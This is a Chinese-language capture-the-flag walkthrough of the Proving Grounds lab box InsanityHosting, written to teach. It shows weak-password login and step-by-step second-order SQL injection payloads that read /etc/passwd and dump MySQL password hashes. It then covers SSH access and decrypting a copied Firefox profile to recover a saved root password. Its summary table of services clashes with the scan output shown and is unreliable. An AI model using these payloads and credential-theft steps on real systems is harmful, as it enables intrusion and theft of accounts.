# InsanityHosting 靶機滲透測試紀錄

> [!info] **靶機基本資訊**
> - **平台**：OffSec Proving Grounds (Play)
> - **作業系統**：linux
> - **難易度**：hard
> - **開始時間**：2026-06-29 23:20

---

## 🔍 1. 偵察與列舉 (Reconnaissance & Enumeration)

### 🚀 快速連接埠掃描 (Nmap)
使用 RustScan 快速定位開放的連接埠：
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ rustscan -a 192.168.157.124 -- -sV

..........

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 61 vsftpd 3.0.2
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.4 (protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.6 ((CentOS) PHP/7.2.33)

```

**掃描結果整理：**

| 連接埠 (Port) | 服務 (Service) | 版本 (Version) | 備註 / 潛在漏洞點 |
| ---------- | ------------ | ------------ | ---------- |
| 21/tcp     | FTP          | Pure-FTPd    | 檔案傳輸服務，嘗試匿名登入無果。 |
| 22/tcp     | SSH          | OpenSSH 7.4p1 Debian 9 | 遠端管理服務，可用於後續憑證登入。 |
| 80/tcp     | HTTP         | Apache httpd 2.4.25 | Web 網頁服務，主要攻擊面。 |

---

### 🌐 網頁服務列舉 (Web Enumeration)
對 80 埠的網頁服務進行目錄爆破。

#### 📁 目錄爆破 (Gobuster / Feroxbuster)
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ dirsearch -u http://192.168.157.124/ -w /usr/share/wordlists/dirb/common.txt 

.........

[11:34:55] 301 -  242B  - /monitoring  ->  http://192.168.157.124/monitoring/
[11:34:56] 301 -  236B  - /news  ->  http://192.168.157.124/news/           
[11:34:58] 301 -  242B  - /phpmyadmin  ->  http://192.168.157.124/phpmyadmin/
[11:34:58] 200 -   85KB - /phpinfo.php                                      
[11:35:07] 301 -  239B  - /webmail  ->  http://192.168.157.124/webmail/
```
**發現的敏感路徑：**
- `http://192.168.x.x/news/` - *發布網站新聞，並在此頁面發現管理者名稱 `otis`*

	![](image/Pasted%20image%2020260629233823.png)
	
- `http://192.168.x.x/monitoring/` - *內部監控系統登入面板*

	![](image/Pasted%20image%2020260629234005.png)
	
- `http://192.168.x.x/webmail/` - *SquirrelMail 1.4.22 登入頁面*

	![](image/Pasted%20image%2020260629234114.png)

---

### 📂 其他服務列舉 (FTP)
> [!tip] **FTP 服務探測**
> *   嘗試匿名登入 (`anonymous` / `anonymous`)，但該服務限制了匿名存取或無可利用檔案，被證實為兔子洞 (Rabbit Hole)。

---

## ⚡ 2. 漏洞分析與初始存取 (Vulnerability Analysis & Initial Access)

### 🕵️ 漏洞分析 (Vulnerability Assessment)
1. **弱憑證嘗試 (Credential Stuffing)**：
   在 `/news/` 頁面枚舉出使用者 `otis` 後，嘗試使用弱密碼登入 `/monitoring/` 與 `/webmail/`。
   成功測試出可用憑證：`otis:123456`。
	![](image/Pasted%20image%2020260629234319.png)

	![](image/Pasted%20image%2020260629234341.png)

3. **二階 SQL 注入 (Second-Order SQLi) 分析**：
   在監控面板 (`/monitoring/`) 中，擁有 `Add Server` 的功能。在此功能中輸入 `Server Name` 會被寫入資料庫。
   *   **觸發點**：系統在背景會執行狀態檢查，一旦伺服器 Down（因填寫虛假 IP 而必定 Down），便會自動向 `otis` 的 SquirrelMail 郵箱發送警報信件（Alert Mail）。
   *   **注入點**：後台寄信腳本在資料庫中執行查詢並讀取 `Server Name` 時，未對其進行參數化過濾，而是直接拼接 SQL，觸發了 SQL 注入，且查詢結果會被反映在寄出的郵件內容中。
	![](image/Pasted%20image%2020260629234834.png)
	![](image/Pasted%20image%2020260629234947.png)
	![](image/Pasted%20image%2020260629235007.png)

---

### 🔑 初始存取突破 (Exploitation)

為了成功取得初始 Shell，我們需要完整利用 `/monitoring/` 面板中的二階 SQL 注入（Second-Order SQLi）漏洞，這需要在 Web 介面注入，並於郵件服務中查收結果。以下是詳細的手工 SQL 注入測試與利用過程：

#### 1. 二階注入漏洞測試與排錯 (SQLi Detection & Delimiter Testing)
由於此漏洞是二階注入，我們在 `Add Server` 頁面輸入的 `Server Name` 會先被寫入資料庫，隨後在後台 Ping 任務偵測到伺服器 Down 並寄送警報郵件給 `otis` 時，才會從資料庫中讀出該名稱並拼接進 SQL 查詢，最後引發注入並將查詢結果呈現在郵件中。

*   **測試單引號 `'` 閉合：**
    *   在 `Add Server` 介面，填入 `Server Name` 為 `'`，`IP Address` 填入 `1.1.1.1`（無效 IP，確保其必定觸發 Host Down 警報）。
		![](image/Pasted%20image%2020260630204007.png)
    *   提交後，登入 SquirrelMail 查收信件。發現能正常收到主旨為 `Host ' is Down` 的信件，說明 SQL 語法未出錯，單引號 `'` 無法用來閉合此處的 SQL 查詢。
		![](image/Pasted%20image%2020260630204137.png)
*   **測試雙引號 `"` 閉合：**
    *   再次新增伺服器，填入 `Server Name` 為 `"`，`IP Address` 為 `1.1.1.2`。
		![](image/Pasted%20image%2020260630204309.png)
    *   提交後，背景任務執行後並**沒有**發送任何郵件至 `otis` 的信箱。這說明雙引號 `"` 導致後台在執行 SQL 拼接時產生了語法錯誤，使發信程式崩潰或中止，進而確認該 SQL 查詢句是以雙引號 `"` 作為字串閉合符。

---

#### 2. 確定欄位數量 (Determining Columns Count via UNION SELECT)
在使用 `UNION SELECT` 獲取資料前，我們必須使我們的聯合查詢欄位數與後台原查詢的欄位數一致，否則 SQL 語法錯誤將導致無法正常寄信。我們可以使用 `-- -` 作為註釋符號，並進行遞增測試(ip 可以留空)：

*   **測試 Payload 1**：`" union select 1-- -` -> 無收到信件。
*   **測試 Payload 2**：`" union select 1,2-- -` -> 無收到信件。
*   **測試 Payload 3**：`" union select 1,2,3-- -` -> 無收到信件。
*   **測試 Payload 4**：`" union select 1,2,3,4-- -` -> **成功收到郵件！**
    *   信件內容中同時反射出了數字 `1`、`2`、`3`、`4`，確認：
        1. 後台原查詢欄位數為 **4**。
			![](image/Pasted%20image%2020260630204515.png)
        2. **所有 4 個欄位均為反射回顯點**，皆可用來顯示注入的查詢結果。
			![](image/Pasted%20image%2020260630204649.png)

---

#### 3. 資料庫資訊枚舉 (Database Enumeration)
得知回顯點後，我們可以利用反射欄位直接查詢資料庫的結構，同樣不需要使用 `group_concat` 函數：

*   **獲取當前資料庫名與使用者**：
    *   在 `Server Name` 輸入：
        ```sql
        " union select 1,database(),user(),4-- -
        ```
    *   收到郵件內容顯示當前資料庫為 `monitoring`，資料庫使用者為 `root@localhost`。
		![](image/Pasted%20image%2020260630204832.png)
*   **獲取資料表名稱 (Tables)**：
    *   在 `Server Name` 輸入：
        ```sql
        " union select 1,table_name,3,4 from information_schema.tables where table_schema=database()-- -
        ```
    *   後台會處理每一行紀錄，我們可在收到的郵件反射點中直接看到資料表名稱：`hosts` 與 `users`。
		![](image/Pasted%20image%2020260630205100.png)
*   **獲取 users 表的欄位名 (Columns)**：
    *   在 `Server Name` 輸入：
        ```sql
        " union select 1,column_name,3,4 from information_schema.columns where table_name='users'-- -
        ```
    *   郵件的反射點將直接顯示 `users` 表的欄位名：`id`、`username`、`password`。
		![](image/Pasted%20image%2020260630205321.png)
---

#### 4. 洩漏憑證與 Hash 爆破 (Credential Extraction & Cracking)
此階段的目標是獲取可以登入 Linux 系統 Shell 的使用者憑證。以下是詳細的思路與操作步驟：

*   **步驟 A：嘗試 Dump 網頁應用程式的 `users` 表**：
    *   在 `Server Name` 輸入以下 Payload：
        ```sql
        " union select 1,username,password,4 from users-- -
        ```
    *   郵件回顯的查詢結果中，我們成功取得網站的註冊帳號：
        *   `admin` (`$2y$12$huPSQmbcMvgHDkWIMnk9t...` - Bcrypt Hash)
        *   `nicholas` (`$2y$12$4R6JiYMbJ7NKnuQE...` - Bcrypt Hash)
        *   `otis` (`$2y$12$./XCeHl0/TCPW5zN/...` - Bcrypt Hash)
			![](image/Pasted%20image%2020260630205703.png)
    *   **現狀分析**：我們此時已經擁有 `otis` 的明文密碼 `123456`，但我們不確定這些帳號是否能用來登入 Linux 系統，或者他們是否存在於底層作業系統中。

*   **步驟 B：讀取系統 `/etc/passwd` 檔案（確認 Linux 本地使用者與 Shell 限制）**：
    *   為了解答上述疑問並獲取系統的使用者清單，我們利用 `load_file()` 函數嘗試讀取本地密碼檔。在 `Server Name` 輸入：
        ```sql
        " union select 1,load_file('/etc/passwd'),3,4-- -
        ```
    *   收到的警報郵件中，成功回顯了系統 `/etc/passwd` 檔案的完整內容。我們針對其中的本地使用者（UID >= 1000）進行篩選與分析：
		![](image/Pasted%20image%2020260630211359.png)
        ```text
        admin:x:1000:1000::/home/admin:/bin/bash
        otis:x:1001:1001::/home/otis:/sbin/nologin
        nicholas:x:1002:1002::/home/nicholas:/bin/bash
        elliot:x:1003:1003::/home/elliot:/bin/bash
        ```
    *   **關鍵安全觀察與結論**：
        1. `admin`、`otis`、`nicholas` 與 `elliot` 確實都是 Linux 本地使用者。
        2. **`otis` 的登入 Shell 被限制為 `/sbin/nologin`**：這完美解釋了為什麼我們之前雖然拿到了 `otis:123456` 的憑證，卻**無法**透過 SSH 登入系統（系統會拒絕無互動式 Shell 的帳號登入）。
        3. **`admin` 與 `nicholas` 的 Bcrypt 密碼雜湊強度過高**，在有限時間內難以爆破。
        4. 名單中存在另一位擁有 `/bin/bash` 權限的系統使用者 **`elliot`**，他成為了我們下一個針對的 SSH 登入目標。

*   **步驟 C：轉向 Dump MySQL 系統使用者表 (`mysql.user`)**：
    *(參考來源：[MariaDB System Tables: mysql.user](https://mariadb.com/docs/server/reference/system-tables/the-mysql-database-tables/mysql-user-table))*
    *   為了獲取 `elliot` 的憑證，我們推測他在系統上的密碼可能與資料庫管理帳號重用。我們轉而向資料庫系統的使用者權限表發起查詢。在 `Server Name` 輸入：
        ```sql
        " UNION SELECT 1,user,password,authentication_string FROM mysql.user-- -
        ```
        *(註：同時投影 `password` 與 `authentication_string` 欄位以相容不同 MySQL 版本)*
    *   收到郵件內容的反射點回顯如下：
        *   欄位 2 顯示：`elliot`
        *   欄位 3 顯示：`*5A5749F309CAC33B27BA94EE02168FA3C3E7A3E9` (MySQL SHA1 Hash)
			![](image/Pasted%20image%2020260630210835.png)
        這使我們成功獲取了資料庫使用者 `elliot` 的憑證，並且其帳號名稱與 Linux 系統上的使用者 `elliot` 一致。

*   **線上 Hash 破解 (CrackStation)**：
    *   由於得到的密碼 Hash `*5A5749F309CAC33B27BA94EE02168FA3C3E7A3E9` 是標準的 MySQL SHA1 雜湊（MySQL 4.1+），我們可以免去本地跑字典的時間，直接將其複製並貼入線上解密網站 [CrackStation](https://crackstation.net/) 進行破解。
    *   經由 CrackStation 的彩虹表比對，即可在瞬間秒破出明文密碼：
		![](image/Pasted%20image%2020260630213334.png)

        > [!key] **Credentials Found**
        > *   **Username**: `elliot`
        > *   **Password**: `elliot123`
        > *   **來源**：`mysql.user` 系統表洩漏與 CrackStation 線上破解（與 Linux 系統帳號密碼重用）

---

#### 5. SSH 登入初始 Access
使用所得到的憑證，通過 SSH 連接至靶機：
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ ssh elliot@192.168.212.124
The authenticity of host '192.168.212.124 (192.168.212.124)' can't be established.
ED25519 key fingerprint is: SHA256:eCrkU/pjlo8f7sNUU6/DASra4biW9OuKmWxQptyXBdw
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.212.124' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
elliot@192.168.212.124's password: 
[elliot@insanityhosting ~]$ find / -type f -name local.txt 2>/dev/null
/home/elliot/local.txt
```
登入成功後，即可在 `elliot` 的家目錄下讀取 `local.txt` 取得初始的 Flag。

---

## 📈 3. 特權提升 (Privilege Escalation)

### 🕵️ 本地資訊收集 (Local Enumeration)
在系統上進行權限枚舉，在 `elliot` 的家目錄下發現了 Mozilla Firefox 的配置檔案夾：
```bash
[elliot@insanityhosting ~]$ ls -al
total 16
drwx------. 4 elliot elliot 128 Dec 15  2020 .
drwxr-xr-x. 7 root   root    76 Aug 16  2020 ..
lrwxrwxrwx. 1 root   root     9 Aug 16  2020 .bash_history -> /dev/null
-rw-r--r--. 1 elliot elliot  18 Apr  1  2020 .bash_logout
-rw-r--r--. 1 elliot elliot 193 Apr  1  2020 .bash_profile
-rw-r--r--. 1 elliot elliot 231 Apr  1  2020 .bashrc
-rw-r--r--  1 elliot elliot  33 Jun 30 14:46 local.txt
drwx------. 5 elliot elliot  66 Aug 16  2020 .mozilla
drwx------. 2 elliot elliot  25 Aug 16  2020 .ssh
[elliot@insanityhosting ~]$ ls -al ./.mozilla/
total 0
drwx------. 5 elliot elliot  66 Aug 16  2020 .
drwx------. 4 elliot elliot 128 Dec 15  2020 ..
drwx------. 2 elliot elliot   6 Aug 16  2020 extensions
drwx------. 4 elliot elliot 102 Aug 16  2020 firefox
drwx------. 2 elliot elliot   6 Aug 16  2020 systemextensionsdev
[elliot@insanityhosting ~]$ ls -al ./.mozilla/firefox/
total 12
drwx------. 4 elliot elliot  102 Aug 16  2020 .
drwx------. 5 elliot elliot   66 Aug 16  2020 ..
drwx------. 8 elliot elliot 4096 Aug 16  2020 esmhp32w.default-default
-rw-rw-r--. 1 elliot elliot   62 Aug 16  2020 installs.ini
-rw-rw-r--. 1 elliot elliot  259 Aug 16  2020 profiles.ini
drwx------. 2 elliot elliot   24 Aug 16  2020 wqqe31s0.default
```
確認該目錄下包含一個 default 設定檔夾，如 `esmhp32w.default-default/`，其中存有包含瀏覽器儲存憑證的敏感檔案：
- `logins.json`
- `key4.db` (金鑰資料庫)
	```bash
	[elliot@insanityhosting ~]$ ls -al ./.mozilla/firefox/esmhp32w.default-default/
	total 11784
	drwx------. 8 elliot elliot    4096 Aug 16  2020 .
	drwx------. 4 elliot elliot     102 Aug 16  2020 ..
	-rw-------. 1 elliot elliot      45 Aug 16  2020 addons.json
	-rw-------. 1 elliot elliot   32349 Aug 16  2020 addonStartup.json.lz4
	-rw-rw-r--. 1 elliot elliot       0 Aug 16  2020 AlternateServices.txt
	drwx------. 2 elliot elliot       6 Aug 16  2020 bookmarkbackups
	-rw-------. 1 elliot elliot     204 Aug 16  2020 broadcast-listeners.json
	-rw-------. 1 elliot elliot  229376 Aug 16  2020 cert9.db
	-rw-------. 1 elliot elliot     398 Aug 16  2020 cert_override.txt
	-rw-------. 1 elliot elliot     167 Aug 16  2020 compatibility.ini
	-rw-------. 1 elliot elliot     939 Aug 16  2020 containers.json
	-rw-r--r--. 1 elliot elliot  229376 Aug 16  2020 content-prefs.sqlite
	-rw-r--r--. 1 elliot elliot  524288 Aug 16  2020 cookies.sqlite
	drwx------. 3 elliot elliot      66 Aug 16  2020 datareporting
	-rw-------. 1 elliot elliot    1302 Aug 16  2020 extension-preferences.json
	drwx------. 2 elliot elliot    8192 Aug 16  2020 extensions
	-rw-------. 1 elliot elliot  360103 Aug 16  2020 extensions.json
	-rw-r--r--. 1 elliot elliot 5242880 Aug 16  2020 favicons.sqlite
	-rw-------. 1 elliot elliot     560 Aug 16  2020 handlers.json
	-rw-------. 1 elliot elliot  294912 Aug 16  2020 key4.db
	-rw-------. 1 elliot elliot     575 Aug 16  2020 logins.json
	-rw-------. 1 elliot elliot      30 Aug 16  2020 notificationstore.json
	-rw-rw-r--. 1 elliot elliot       0 Aug 16  2020 .parentlock
	-rw-r--r--. 1 elliot elliot   98304 Aug 16  2020 permissions.sqlite
	-rw-------. 1 elliot elliot     478 Aug 16  2020 pkcs11.txt
	-rw-r--r--. 1 elliot elliot 5242880 Aug 16  2020 places.sqlite
	-rw-------. 1 elliot elliot   14957 Aug 16  2020 prefs.js
	drwx------. 2 elliot elliot    4096 Aug 16  2020 saved-telemetry-pings
	-rw-------. 1 elliot elliot    2552 Aug 16  2020 search.json.mozlz4
	-rw-rw-r--. 1 elliot elliot       0 Aug 16  2020 SecurityPreloadState.txt
	-rw-------. 1 elliot elliot     288 Aug 16  2020 sessionCheckpoints.json
	drwx------. 2 elliot elliot      68 Aug 16  2020 sessionstore-backups
	-rw-------. 1 elliot elliot    3520 Aug 16  2020 sessionstore.jsonlz4
	-rw-rw-r--. 1 elliot elliot     702 Aug 16  2020 SiteSecurityServiceState.txt
	drwxr-xr-x. 3 elliot elliot      23 Aug 16  2020 storage
	-rw-r--r--. 1 elliot elliot     512 Aug 16  2020 storage.sqlite
	-rw-------. 1 elliot elliot      50 Aug 16  2020 times.json
	-rw-rw-r--. 1 elliot elliot       0 Aug 16  2020 TRRBlacklist.txt
	-rw-r--r--. 1 elliot elliot   98304 Aug 16  2020 webappsstore.sqlite
	-rw-------. 1 elliot elliot     139 Aug 16  2020 xulstore.json
	```

---

### 👑 提權利用 (Exploitation to Root / SYSTEM)

#### 1. 打包與傳輸憑證檔案
在靶機上將該配置目錄打包，並傳輸至攻擊機 (Kali)：
```bash
[elliot@insanityhosting ~]$ cd ./.mozilla/firefox/
[elliot@insanityhosting firefox]$ tar -czvf profile.tar.gz esmhp32w.default-default/
```
在攻擊機端下載此打包檔並解壓縮：
```bash
┌──(kali㉿kali)-[~/Desktop/InsanityHosting]
└─$ scp elliot@192.168.212.124:/home/elliot/.mozilla/firefox/profile.tar.gz .
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
elliot@192.168.212.124's password: 
profile.tar.gz                                                                           100%   40MB   4.6MB/s   00:08    
                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/InsanityHosting]
└─$ tar -xzvf profile.tar.gz 
```

#### 2. 使用 firefox_decrypt 進行解密
在攻擊機下載解密工具：
```bash
┌──(kali㉿kali)-[~/Desktop/InsanityHosting]
└─$ git clone https://github.com/unode/firefox_decrypt.git                                                           
Cloning into 'firefox_decrypt'...
remote: Enumerating objects: 1504, done.
remote: Counting objects: 100% (292/292), done.
remote: Compressing objects: 100% (37/37), done.
remote: Total 1504 (delta 274), reused 255 (delta 255), pack-reused 1212 (from 3)
Receiving objects: 100% (1504/1504), 521.90 KiB | 3.43 MiB/s, done.
Resolving deltas: 100% (931/931), done.
                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/InsanityHosting]
└─$ cd firefox_decrypt

┌──(kali㉿kali)-[~/Desktop/InsanityHosting/firefox_decrypt]
└─$ ls
CHANGELOG.md  CONTRIBUTORS.md  firefox_decrypt.py  LICENSE  pyproject.toml  README.md  tests

```
執行工具並指定解壓出的 Firefox 設定檔路徑：
```bash
┌──(kali㉿kali)-[~/Desktop/InsanityHosting/firefox_decrypt]
└─$ python3 firefox_decrypt.py ../esmhp32w.default-default 
2026-06-30 10:04:10,591 - WARNING - profile.ini not found in ../esmhp32w.default-default
2026-06-30 10:04:10,591 - WARNING - Continuing and assuming '../esmhp32w.default-default' is a profile location

Website:   https://localhost:10000
Username: 'root'
Password: 'S8Y389KJqWpJuSwFqFZHwfZ3GnegUa'

```
執行後，解密工具會成功讀取資料庫，並顯示儲存在瀏覽器中的憑證：
> [!key] **Root Credentials**
> *   **Username**: `root`
> *   **Password**: `S8Y389KJqWpJuSwFqFZHwfZ3GnegUa`

#### 3. 取得 Root 權限
在當前 session 執行 `su root`：
```bash
[elliot@insanityhosting firefox]$ su root
Password: 
[root@insanityhosting firefox]# find / -type f -name proof.txt 2>/dev/null
/root/proof.txt
```
登入成功後，可在 `/root/proof.txt` 讀取 Root Flag。

---

## 💡 4. 心得與學習點 (Key Takeaways)

1. **為什麼這個漏洞會存在？**
   - **弱密碼與預設憑證**：Otis 使用了 `123456` 這種極易被爆破的弱密碼，導致攻擊者可以進入內部管理後台與郵政系統。
   - **二階 SQL 注入防護不全**：程式開發時可能注意到了第一層輸入的過濾，但沒有對資料庫取出後的「二次資料」在調用時進行參數化處理，使得攻擊者可以將惡意字串埋入資料庫中，待特定背景任務執行時觸發 SQL 注入。
   - **明文憑證留存於瀏覽器**：在 Linux 環境中，管理員使用 Firefox 儲存了 root 的敏感帳密，且未設定主密碼 (Master Password)，導致其設定檔一旦被低權限使用者取得，即可被輕易還原。

2. **安全防禦建議：**
   - 強制內部所有系統執行複雜密碼策略，並關閉不必要的 FTP 服務。
   - 所有的資料庫查詢均應使用參數化查詢 (Parameterized Queries) 或是 Prepared Statement，防止二階 SQL 注入。
   - 伺服器環境中不建議使用瀏覽器儲存管理員憑證；若有必要，必須啟用主密碼進行金鑰庫的加密保護。

3. **我學到了什麼新技巧？**
   - 學習了二階 SQL 注入與郵件警報 (Email Alert) 結合的巧妙資訊洩漏鏈。
   - 掌握了利用 `firefox_decrypt` 導出 Linux 本地瀏覽器儲存憑證的特權提升技巧。
